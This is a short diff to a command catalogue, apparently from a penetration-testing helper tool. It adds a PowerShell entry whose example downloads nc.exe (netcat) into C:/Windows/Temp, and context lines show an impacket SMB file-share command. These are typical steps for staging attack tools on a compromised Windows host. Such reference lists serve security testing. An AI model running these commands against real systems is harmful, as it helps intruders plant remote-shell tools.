@@ -108,6 +108,15 @@ examples = [
     "sudo smbserver.py test /tmp/share/ -smb2support  -username test -password test"
 ]
 
+[command.PowerShell-Download]
+name_exe = "powershell wget"
+cmd_types = "network"
+args = "-Uri http://<ip|127.0.0.1>/<file> -OutFile <ofile|C:/Windows/Temp/f.exe>"
+explanation = "Download file from Windows PowerShell"
+examples = [
+    "powershell wget -Uri http://127.0.0.1/nc.exe -OutFile C:/Windows/Temp/nc.exe"
+]
+
 
 # ===== SYSADMIN COMMANDS =====
 # ============================ #
